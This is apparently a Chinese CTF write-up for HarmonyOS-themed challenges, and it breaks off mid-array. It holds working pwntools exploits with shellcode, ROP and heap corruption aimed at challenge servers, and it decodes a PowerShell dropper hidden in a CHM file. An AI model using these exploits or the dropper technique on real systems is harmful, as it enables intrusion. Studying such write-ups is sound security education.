哪有什么战队_从来都是一个人

# 0x01 harmofs01
很明显整数溢出到越界
小的堆喷来获得相邻的heap
leak heap地址后，根据和libc偏移打io即可
```
from pwn import *
context.log_level = 'debug'

#p = process("./start_qemu.sh")

def touch(name, size):
    p.sendlineafter("h > ", "touch")
    p.sendlineafter("File size: ", str(size))
    p.sendlineafter("File name: ", name)

def do1_seek(name, offset):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "3")
    p.sendlineafter("Mode: ", "1")
    p.sendlineafter("Offset: ", str(offset))

def read(name, size, note):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "1")
    p.sendlineafter("Size: ", str(size))
    p.send(note)

def write(name, size):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "2")
    p.sendlineafter("Size: ", str(size))

def delete(name):
    p.sendlineafter("h > ", "fileop")
    p.sendlineafter("File name: ", name)
    p.sendlineafter("Operation: ", "4")

#p.sendlineafter("kirin: ","123")
#p.sendlineafter("\x23\x20\x1b\x5b\x30\x6d","cd /bin")
#p.sendlineafter("\x23\x20\x1b\x5b\x30\x6d","./harmofs")
p=remote("124.71.139.184",30719)
p.recvuntil("Gift: ")
libc=int(p.recvuntil("\n").strip(),16)-0x00086eb8
p.recvuntil("Gift: ")
elf=int(p.recvuntil("\n").strip(),16)-0x012D8 
for i in range(16):
   touch("a"+str(i),0x3f0)
delete("a12")
delete("a14")

#delete("a12")
do1_seek("a15", 2147483648)
do1_seek("a15", 2147483648-0x1c)
read("a15",0x1c,p32(0x14)+p32(0xfffffbc4-0x1c)+"aaaa"+p32(0)*3+p32(0xffffffff)+"\n")
write("aaaa\x00",8)
#do1_seek("a8", 2147483648)
#do1_seek("a8", 2147483648-0x1c)
#read("a8",0x1c,p32(0)+p32(0x419-0x1c)+p32(elf+0x3064-0x1c)+p32(elf+0x3064-0x18)+"\n")
#delete("aaaa\x00")

p.recvuntil("\x0d\x0a\x0d\x60")
p.recv(3)
heap=u32(p.recv(4))+0xc84
print hex(heap)
#pause()
#p.interactive()
magic=libc+0x252311e8-0x2518d000-heap
if magic<0:
   magic+=0x100000000

payload="/etc/flag\x00"+"\x00"*2+p32(libc-0x2518d000+0x25210428)
payload+=p32(libc-0x2518d000+0x25234864)*2+p32(0)+p32(libc-0x2518d000+0x25234864)
payload+=p32(0)+p32(elf+0x1248)
do1_seek("aaaa\x00", 1048-0x1c+28)
read("aaaa\x00",8,p32(0x14)+p32(magic-8)+"\n")

p.recvuntil("Not supported\r\r\n")
pause()
read("aaaa\x00",len(payload),payload+"\n")
print hex(libc),hex(elf),hex(heap)
#delete("/etc/flag\x00")
#flag{HarmonyOS_HAS_AN_CO0L_FS}
p.interactive()
```
# 0x02 honormap01
scanf越界导致前面的判断失效
而后溢出写edit function指针即可
```
from pwn import *


context.log_level="debug"
p=process("./start_qemu.sh")

def cmd(ch):
    p.sendlineafter("CMD > ",ch)

def do(note):
     p.sendlineafter(": ",str(note))
def add(hi,wi,ty):
    cmd("alloc")
    do(hex(hi))
    do(hex(wi))
    do(ty)
def show(index):
    cmd("view")
    do(index)

def edit(index,x,y,s,note):
    cmd("edit")
    do(index)
    do(x)
    do(y)
    do(s)
    do(note)
#p=remote("124.71.139.184",32280)
p.recvuntil("[Init] main, entering wait.\r\r\n")
p.sendline()
add(0,0x800000,0)
add(0x11,0x11,0)
add(0,0x800000,0)
add(0,0x800000,0)
add(0,0x800000,0)
add(0,0x800000,0)
show(4)
p.recvuntil("\x00"*8)
p.recvuntil("\xa0")
elf=u64("\xa0"+p.recv(7))-0x11a0
edit(5,25,0,80,p64(elf+0x1350))
edit(4,25,0,80,"111111111111111111111111"+"/etc/flag\x00")
print hex(elf)
cmd("edit")
do(5)
p.interactive()
```

# 0x03 luaplayground01
应该是非预期？
试了一下lua可以open文件
直接dump二进制程序逆向即可(简单的xor)
dump：
```
from pwn import *

context.log_level="debug"

def cmd(s):
   p.sendlineafter("> ",s)
def l(s):
    f=open("3.txt","a+")
    f.write(s)
    f.close()
p=remote("124.70.221.177",30594)
p.recvuntil("[Init] main, entering wait.\r\r\n")
p.sendline()
p.sendlineafter("> ","f=io.open(\"/bin/flag_app\", \"rb\")")
p.sendlineafter("> ","content=f:read(\"*all\")")

for i in range(0,130): #脚本dump另一个题目时候改过，忘记具体len了
     print str(i)+",--------------"
     cmd("s=string.gsub(string.sub(content,%s,%s),\"(.)\",function (x) return string.format(\"%%02X \",string.byte(x)) end)" %(i*100,i*100+100))  
     
     cmd("print(s)")
     p.recvuntil("print(s)\r\n\r")
     l(p.recvuntil("\r\r\n").strip())
p.interactive()

```
decode:
```
s= [0x9C, 0x6D, 0xE7, 0x56, 0x06, 0xD2, 0x0D, 0xEB, 0xDD, 0xF0, 
  0x9E, 0xB7, 0xFB, 0xE6, 0xEC, 0x3B, 0xB7, 0x5E, 0x75, 0x53, 
  0xD6, 0x83, 0x75, 0xAF, 0x18, 0xF7, 0x99, 0x95, 0xF2, 0xC1, 
  0xF2, 0xDB, 0x9F, 0x65, 0xB4, 0x06, 0x49, 0x87, 0x58, 0xE2, 
  0xDE, 0xB5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, ]
s2=[  0xFA, 0x01, 0x86, 0x31, 0x7D, 0xB1, 0x69, 0xD3, 0xB8, 0xC8, 
  0xA6, 0xD6, 0x98, 0xCB, 0x8E, 0x03, 0xD1, 0x68, 0x58, 0x67, 
  0xB2, 0xE6, 0x40, 0x82, 0x7A, 0xC3, 0xFD, 0xA1, 0xDF, 0xF0, 
  0x96, 0xBF]
ans=""
for i in range(0x2a):
  ans+=chr(s[i]^s2[i&0x1f])
print ans
```

# 0x04 luaplayground02

和luaplayground01一样dump出/etc/flag2.lua
但是发现luadec无法解，格式问题，猜测应该是架构问题
但是在鸿蒙中直接运行，发现attach到进程后，在内核态搜索到了flag字符：
```
06:0018│      0x402b0428 ◂— andeq  r0, r2, #0x20000000 /* 0x2020202 */
07:001c│      0x402b042c ◂— movweq r0, #0x3303 /* 0x3030303 */
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0 40007c0c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGINT
pwndbg> search -p 0x67616c66
<explored>      0x400dadcb strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags!\n' */
<explored>      0x400dda3a strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x400de88d strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag error!\n' */
<explored>      0x400df0bf strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags:0x%x, len=%d\n\r\n' */
<explored>      0x400e8009 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags:%d\n\r\n' */
<explored>      0x400e98b9 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags: 0x%x\n' */
<explored>      0x400ea62d strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags: 0x%x\n' */
<explored>      0x400eeea6 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags      pages   pg/ref\n' */
<explored>      0x400f02ce strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags set' */
<explored>      0x400f723c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x400f736c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x400f746c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x4027716e strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag\n' */
<explored>      0x4036efd7 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag\r\n' */
<explored>      0x40445964 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag' */
<explored>      0x40445981 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag' */
<explored>      0x4044d127 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x404600e9 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flagdata' */
<explored>      0x4046055c strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x40460657 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x404a1720 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71' */
<explored>      0x404a1750 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f717' */
<explored>      0x404a17a0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f7170' */
<explored>      0x404a17d0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707' */
<explored>      0x404a1820 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e' */
<explored>      0x404a1870 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-' */
<explored>      0x404a18c0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-3' */
<explored>      0x404a20de strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags' */
<explored>      0x40504d68 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flags)' */
<explored>      0x4050f830 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9' */
<explored>      0x4050f870 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f' */
<explored>      0x4050f8b0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f2' */
<explored>      0x4050f8f0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22' */
<explored>      0x4050f930 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22b' */
<explored>      0x4050f970 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb' */
<explored>      0x4050f9b0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb2' */
<explored>      0x4050f9f0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28' */
<explored>      0x4050fa30 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28d' */
<explored>      0x4050fa70 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28de}' */
<explored>      0x4050fac0 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28de' */
<explored>      0x4050fb10 strbvs r6, [r1, -r6, ror #24]! /* 0x67616c66; 'flag{4f71707e-35c7-4159-ab54-ab9f22bb28de}' */
```

提交即可：flag{4f71707e-35c7-4159-ab54-ab9f22bb28de}

# 0x05 签到
公众号领flag

# 0x06 harmoshell

栈溢出+shellcode
```
from pwn import *
import sys
context.log_level="debug"

if len(sys.argv)>=2:
   p=process(["./qemu-riscv64","-L","./libs/","./harmoshell"])
else:
      p=process(["./qemu-riscv64","-g","1234","-L","./libs/","./harmoshell"])

def add(name):
   p.sendlineafter("$ ","touch "+name)

def delete(name):
   p.sendlineafter("$ ","rm "+name)

def show(name):
     p.sendlineafter("$ ","cat "+name)

def edit(name,note,ch=1):
   if  ch:
      p.sendlineafter("$ ","echo >> "+name)
      p.sendline(note)
   else:
      p.sendlineafter("$ ","echo > "+name)
      p.sendline(note)
      #p.sendline()
code="\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xee\x93\x06\xe1\xef\x67\x80\xe6\xff"
p=remote("121.37.222.236",9999)
add("aaaa")
add("bbbb")
add("cccc")
delete("bbbb")
delete("aaaa")
add("aaaa")
show("aaaa")
p.recvuntil("Content: ")
heap=u64(p.recvuntil("\n").strip().ljust(8,"\x00"))-0x140
edit("aaaa",code,1)
print hex(heap)
for i in range(44):
    add("a"+str(i))
ans=""
for i in range(48):
   ans+=p64(i*0x10000)
ans=ans.replace(p64(0x270000),p64(heap))
edit("a48",ans,1)
p.interactive()
#0x0000004000a09ddc-0x000000000066ddc
```
# 0x07 harmoshell2

echo操作可以堆溢出，修改下一个chunk的fd即可任意地址分配
而后修改GOT表到shellcode
```
from pwn import *
import sys
context.log_level="debug"

if len(sys.argv)>=2:
   p=process(["./qemu-riscv64","-L","./libs/","./harmoshell2"])
else:
      p=process(["./qemu-riscv64","-g","1234","-L","./libs/","./harmoshell2"])

def add(name):
   p.sendlineafter("$ ","touch "+name)

def delete(name):
   p.sendlineafter("$ ","rm "+name)

def show(name):
     p.sendlineafter("$ ","cat "+name)

def edit(name,note,ch=1):
   if  ch:
      p.sendlineafter("$ ","echo >> "+name)
      p.send(note)
   else:
      p.sendlineafter("$ ","echo > "+name)
      p.send(note)
      #p.sendline()
p=remote("139.159.132.55",9999)
for i in range(10):
    add("a"+str(i))
for i in range(8):
   delete("a"+str(7-i))  

for i in range(7):
   add("a"+str(i))  
code="\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x93\x06\x30\x07\x23\x0e\xd1\xee\x93\x06\xe1\xef\x67\x80\xe6\xff"

add("aaaa") 
edit("aaaa","aaaaaaaa",0)
show("aaaa")
p.recvuntil("a"*8)
libc=u64(p.recvuntil("\n").strip().ljust(8,"\x00"))+0x4000000000- 0x0000004000aaa9f8+0x0000004000a09aa6-0x000000000066aa6
delete("a5")
delete("a6")
delete("a4")

edit("aaaa",code.ljust(0x80,"a"))
edit("aaaa","a"*0x88)
show("aaaa")
p.recvuntil("a"*0x88)
p.recvuntil("\xa0")
heap=u64(("\xa0"+p.recvuntil("\n")).strip().ljust(8,"\x00"))
print hex(libc),hex(heap)
edit("aaaa",p64(0x130c0))
add("bbbb")
add("cccc")

add("dddd")
delete("a3")
edit("dddd",code)
#edit("dddd","/bin/sh\x00"+p64(libc+0x00388fe),0)
add("aaa")
p.interactive()
```

# 0x08 pwn1
栈溢出且存在printf输出函数
可以leak + system
或者利用qemu NX失效直接shellcode
合理利用main函数中通过R3/R11寄存器设置printf/read函数的参数即可
```
from pwn import *
import sys
context.log_level="debug"

if len(sys.argv)>=2:
   p=process(["qemu-arm","-L","./","./bin"])
else:
      p=process(["qemu-arm","-g","1234","-L","./","./bin"])
#0x00010500 : pop {fp, pc}
#0x00010348 : pop {r3, pc}
#0x00010498 : pop {r4, pc}
p=remote("139.159.210.220",9999)
ans=""
magic=0x104D8 
popr3=0x00010348
for i in range(0x3d):
   ans+=p32(i*0x100)
payload="aaaa"*0x40+p32(0x2100c+0x104-8)+p32(popr3)+p32(0x2100c)+p32(magic)
payload+=p32(popr3)+p32(0x2100c-8)+p32(0)+p32(magic)
p.sendafter("input: ",payload)
libc=u32(p.recv(4))-0x46454
print hex(libc)
print len(ans)
ans="hp\x00\xe3AqD\xe3\x04p-\xe5/\x7f\x02\xe3/sG\xe3\x04p-\xe5/r\x06\xe3i~F\xe3\x04p-\xe5\r\x00\xa0\xe1sx\x06\xe3\x04p-\xe5\x0c\xc0,\xe0\x04\xc0-\xe5\x04\x10\xa0\xe3\r\x10\x81\xe0\x01\xc0\xa0\xe1\x04\xc0-\xe5\r\x10\xa0\xe1\x02 \"\xe0\x0bp\xa0\xe3\x00\x00\x00\xef".ljust(244,"\x00")
p.send("/bin/sh\x00"+p32(0x2100c+4)+ans+p32(0)+p32(popr3)+p32(0x2100c-8)+p32(magic))
p.interactive()
```

# 0x09 crash
md5 + xor
每四字节一个md5，somd5都可以直接搜到
```
key="bo&tn&o#~{c|v\x7fut.yb&y|''s.v|gg `"
ans=""
for i in key:
  ans+=chr(ord(i)^0x17)
print ans
```

# 0x0A re123

拿到题目file一下，是chm，然后解压打开每个文件都看看，doc.htm里有powershell执行的命令，把编码的命令拿出来，从网上找个Base64解码函数，解出来看看

```powershell
PS C:\ctf\> function ConvertFrom-Base64String([string]$string)
>> {
>>     $byteArray = [Convert]::FromBase64String($string)
>>         [System.Text.UnicodeEncoding]::Unicode.GetString($byteArray)
>> }

PS C:\ctf\> ConvertFrom-Base64String("SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAgACgAJAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBEAGUAZgBsAGEAdABlAFMAdAByAGUAYQBtACAAKAAkACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACAAKAAsACQAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAVABZADUAQgBDADQASQB3AEcASQBiAHYAZwB2ADkAaABqAEIAMgBNAGMASgBoAEUAaABOAEMAaABKAE0ARwBUAGsATgAyAHEAZwA3AHEAdgBGAEgAUQBUAC8AYgBMADUANwA1AHYAcABvAFYAMgAvADUAMwBuADIAcwBrAEoASgBCAEkAbgBrAFEARwA1AHgAdwBxAE8AcQBoAGsAYwBRAFgAQwBBAFQAeAA3AHEAKwBnAGsAYQBIAHMAdgBZAGoANwBrAEkAVgB2AEMAZwBiAHUAcgBJAHQAVgBnAG0AOQBNAFQAeABiAFYAQgA1AEwAQQBUAHAANQBPAGwAUQB2AGIANgBJAE0AVgAwAEwAZABRAHYAZABQAHAAdQArADgAeAA2ADYAUwBMADIAZQBPAHIATQBsACsAQwBrADcAbgBhAFUAQQA2ADkAZwBnAE4ARAA1AFUAYwBvAEUATwB6AEkAKwBwAFUAYwA4AHAANgAyAEcAMwBUAFIAWgB1AGIAdgAzADQASwA2AEkAYgBMAGUAcwBwAEEARABvAEcAUgAyADcAdgB2ACsAUgA3AEgAcABxAFgAegB0ADgAUQA5AHkAMABJAEoASQA1AE4AOABSAEwAQwB0AEwAdwA9AD0AJwApACkAKQApACwAIABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACwAIABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA==") > z
```

得到的东西

```powershell
PS C:\ctf\> type z
Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream(,$([Convert]::FromBase64String('TY5BC4IwGIbvgv9hjB2McJhEhNChJMGTkN2qg7qvFHQT/bL575vpoV2/53n2skJJBInkQG5xwqOqhkcQXCATx7q+gkaHsvYj7kIVvCgburItVgm9MTxbVB5LATp5OlQvb6IMV0LdQvdPpu+8x66SL2eOrMl+Ck7naUA69ggND5UcoEOzI+pUc8p62G3TRZubv34K6IbLespADoGR27vv+R7HpqXzt8Q9y0IJI5N8RLCtLw==')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();
```

把IEX改成echo一下，看看内容

```powershell
PS C:\ctf\> echo $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream(,$([Convert]::FromBase64String('TY5BC4IwGIbvgv9hjB2McJhEhNChJMGTkN2qg7qvFHQT/bL575vpoV2/53n2skJJBInkQG5xwqOqhkcQXCATx7q+gkaHsvYj7kIVvCgburItVgm9MTxbVB5LATp5OlQvb6IMV0LdQvdPpu+8x66SL2eOrMl+Ck7naUA69ggND5UcoEOzI+pUc8p62G3TRZubv34K6IbLespADoGR27vv+R7HpqXzt8Q9y0IJI5N8RLCtLw==')))), [IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd();

$content = [IO.File]::ReadAllText("$pwd\doc.chm")
$idx1 = $content.IndexOf("xxxxxxxx")

$helper = $content.Substring($idx1 + 8)
$cont = [System.Convert]::FromBase64String($helper)

Set-Content "$env:temp\2020.tmp" $cont -Encoding byte
```

所以运行找个是可以得到一个文件的，查看文件，发现是缺少文件头的可执行文件，补上文件头是一个64位Dll

```cpp
__int64 __fastcall StartAddress(LPVOID lpThreadParameter)
{
  __int64 v2[2]; // [rsp+20h] [rbp-E0h]
  char mid_val[192]; // [rsp+30h] [rbp-D0h]
  _QWORD res[2]; // [rsp+F0h] [rbp-10h]
  char v5[16]; // [rsp+100h] [rbp+0h]

  *v5 = 0x16157E2B;
  *&v5[4] = 0xA6D2AE28;
  *&v5[8] = 0x8815F7AB;
  *&v5[12] = 0x3C4FCF09;
  res[0] = 0xE799D643453FF4B5i64;
  res[1] = 0x46C42084AA2A1B56i64;
  LOBYTE(v2[0]) = 0;
  sub_180001100(mid_val, v5);
  sub_1800015B0(v2, mid_val);
  if ( res[0] == v2[0] && res[1] == v2[1] )
    WinExec("calc", 5u);
  return 0i64;
}
```

翻看一下俩函数，发现引用了AES的表。直接AES解密

```python
import struct
from Crypto.Cipher import AES
'''
*v5 = 0x16157E2B;
*&v5[4] = 0xA6D2AE28;
*&v5[8] = 0x8815F7AB;
*&v5[12] = 0x3C4FCF09;

res[0] = 0xE799D643453FF4B5i64;
res[1] = 0x46C42084AA2A1B56i64;
'''
res = struct.pack("QQ", 0xE799D643453FF4B5, 0x46C42084AA2A1B56)
key = struct.pack("IIII", 0x16157E2B, 0xA6D2AE28, 0x8815F7AB, 0x3C4FCF09)

aes = AES.new(key, AES.MODE_ECB)
z = aes.decrypt(res)
print z

# flag{youcangues}
```

# 0x0B aRm 

打开题目，标标函数，然后看看逻辑，题目要求输入一个key，输入一个flag，然后用key做srand种子，产生42\*42的矩阵，然后和42长度的Flag相乘，得到一个特定的向量。那么由于srand的值只有255种可能，所以使用sage枚举一下既可。

```c
int sub_10628()
{
  int result; // r0
  int v1; // [sp+4h] [bp-138h] BYREF
  int i; // [sp+8h] [bp-134h]
  int j; // [sp+Ch] [bp-130h]
  int k; // [sp+10h] [bp-12Ch]
  int v5; // [sp+14h] [bp-128h]
  _DWORD v6[42]; // [sp+18h] [bp-124h] BYREF
  char v7[8]; // [sp+C0h] [bp-7Ch] BYREF
  char xor_data_cpy[44]; // [sp+C8h] [bp-74h] BYREF
  char flag[64]; // [sp+F4h] [bp-48h] BYREF
  int v10; // [sp+134h] [bp-8h]

  v10 = dword_97F8C;
  strcmp(xor_data_cpy, &xor_data);
  printf("key: ");
  scanf("%d", &v1);
  srand((unsigned __int8)v1);
  printf("flag: ");
  scanf("%50s", flag);
  strcpy(v7, "flag{");
  if ( strlen(flag) == 42 && !strncmp(v7, flag, 5) && flag[41] == '}' )
  {
    for ( i = 0; i <= 41; ++i )
      flag[i] ^= xor_data_cpy[i];
    for ( j = 0; j <= 41; ++j )
    {
      v6[j] = 0;
      for ( k = 0; k <= 41; ++k )
      {
        v5 = (unsigned __int8)(rand() + 1);
        v6[j] += (unsigned __int8)flag[k] * v5;
      }
    }
    output_num((int)v6, 42);
  }
  else
  {
    sub_18258("invalid format");
  }
  result = 0;
  if ( v10 != dword_97F8C )
    exit(0);
  return result;
}
```

把rand用C先跑出来rand的值，然后写个脚本让sage去解。

```python
#!/usr/bin/sage

z1 = [[104,199,106,116,82,0,75,237,42,206,187,172,243,252,228,71,125,195,85,249,28,233,232,142,119,91,47,100,52,160,202,155,103,51,14,184,50,89,164,91,38,94],[6,24,89,234,95,213,172,179,206,199,156,181,85,18,15,131,117,66,34,62,221,136,113,234,63,162,66,226,253,104,63,2,127,152,235,221,108,151,144,57,93,43],[237,177,60,252,51,176,61,85,237,25,220,93,3,27,255,68,252,251,171,59,252,42,210,231,6,61,125,149,118,217,191,98,138,250,93,188,169,154,16,150,178,236],[242,180,6,240,248,1,234,162,59,230,203,12,204,209,73,72,101,190,32,36,31,169,29,124,101,198,21,116,91,198,95,76,122,100,60,113,101,37,18,159,10,221],[171,213,173,243,28,17,176,60,52,206,228,81,73,72,22,93,188,112,35,26,187,156,126,246,12,226,27,29,128,36,249,42,249,165,28,20,182,203,79,233,153,51],[57,225,122,78,62,53,189,96,79,120,251,204,109,6,173,135,34,44,171,27,86,163,191,113,182,116,60,5,93,212,55,149,180,176,227,241,229,159,80,51,22,74],[254,131,79,170,9,113,213,179,139,42,85,73,155,11,189,214,15,25,169,69,173,92,244,143,77,216,46,156,10,67,230,7,197,52,176,206,164,133,128,46,174,213],[119,72,223,51,29,237,75,197,49,247,33,36,134,109,252,179,8,5,245,237,12,186,33,187,135,196,63,6,242,237,218,104,52,184,154,81,164,228,21,212,218,53],[248,95,161,243,17,169,247,6,149,2,191,181,189,69,121,251,74,106,231,36,209,27,219,106,107,127,77,127,82,38,180,73,133,84,59,149,252,50,154,145,51,88],[69,239,156,189,234,230,38,208,9,246,234,227,95,84,97,171,211,179,209,134,251,85,217,54,233,213,103,131,101,153,218,169,136,118,102,113,91,139,64,99,129,42],[69,223,125,166,138,79,88,90,212,82,174,173,135,150,129,237,24,229,134,242,141,13,103,242,125,193,125,188,35,253,229,103,219,98,12,100,176,99,189,132,181,106],[48,59,0,176,40,23,148,173,8,32,185,110,18,53,46,142,240,80,138,213,183,100,54,194,200,229,37,132,104,217,238,151,19,237,70,58,3,217,230,11,249,158],[120,10,210,166,151,194,245,32,150,171,131,203,109,74,175,145,206,23,105,187,173,123,167,243,181,169,203,154,179,195,56,43,204,9,208,98,202,196,129,95,111,4],[41,219,77,216,107,26,238,211,212,154,77,122,140,1,35,87,155,213,25,210,255,229,218,206,70,164,146,199,2,0,202,43,218,22,2,68,48,239,22,3,136,98],[125,20,99,159,106,253,115,130,206,114,102,167,63,172,74,208,114,76,207,59,118,168,80,119,235,127,101,0,130,236,98,254,255,196,156,104,192,14,234,141,127,79],[51,190,250,125,141,107,200,92,165,61,3,245,179,238,115,23,237,244,2,78,241,1,17,140,104,208,154,81,92,24,160,143,213,153,11,98,4,210,189,168,14,191],[156,192,172,15,214,153,2,215,230,243,215,247,126,63,198,23,143,34,47,46,176,3,199,186,100,202,139,32,113,152,223,13,87,138,27,44,34,28,2,8,14,217],[254,140,23,195,162,165,228,208,211,147,211,153,76,54,98,214,86,210,109,52,222,195,189,248,238,223,20,240,230,33,200,227,172,222,165,78,130,137,29,84,27,239],[236,103,37,77,60,122,31,169,173,252,107,105,244,89,71,7,72,44,39,15,14,211,236,179,32,109,59,60,193,85,43,172,187,79,249,247,200,23,159,116,18,9],[220,5,97,35,11,168,78,50,182,92,4,161,14,35,14,72,94,206,156,136,121,87,214,113,77,157,135,235,16,153,243,236,157,84,14,168,251,91,217,177,182,220],[81,195,254,94,10,91,43,166,227,164,252,184,20,72,85,155,50,100,51,36,79,207,119,92,118,114,183,78,34,108,41,114,47,38,208,56,129,250,221,99,157,216],[26,177,31,110,75,80,210,125,116,32,75,234,124,193,91,50,14,124,157,55,238,203,92,189,3,220,182,223,62,83,183,88,3,213,197,77,37,150,201,152,182,19],[129,49,211,220,98,225,87,254,23,68,201,114,0,203,78,182,169,139,8,95,226,10,52,167,86,88,60,30,239,241,48,111,33,3,74,130,227,161,128,249,228,72],[106,228,18,183,153,186,66,160,25,35,169,76,201,254,163,5,27,145,245,74,255,22,76,73,151,46,233,22,38,204,93,144,175,110,70,71,40,135,230,64,170,142],[139,114,139,45,118,165,189,107,239,187,128,58,3,22,104,235,44,141,183,136,28,101,246,98,172,29,232,145,92,145,31,230,3,169,18,120,78,206,226,60,136,97],[117,139,119,220,117,162,105,43,41,132,144,30,229,59,58,205,203,149,93,233,122,95,146,139,215,223,88,184,26,224,25,142,106,143,106,222,48,210,9,88,85,152],[118,58,210,175,6,156,68,98,133,189,193,22,72,151,244,159,78,13,126,102,154,231,244,3,197,35,212,205,123,41,100,240,98,53,158,103,208,225,200,84,158,136],[105,229,30,92,131,108,104,1,209,2,231,197,4,171,231,216,119,97,0,218,80,97,14,238,199,222,206,142,49,107,22,154,79,51,245,210,158,93,210,111,94,184],[51,97,99,25,56,217,122,55,179,201,151,192,182,93,157,132,235,206,238,0,103,61,50,91,14,208,183,223,62,20,150,112,117,248,136,172,209,1,227,131,202,121],[66,127,214,223,2,192,172,240,191,18,44,240,108,57,191,35,23,252,54,172,107,170,164,243,86,116,243,56,246,188,176,55,59,133,21,60,68,192,43,2,209,86],[242,61,142,176,95,164,172,148,80,22,62,243,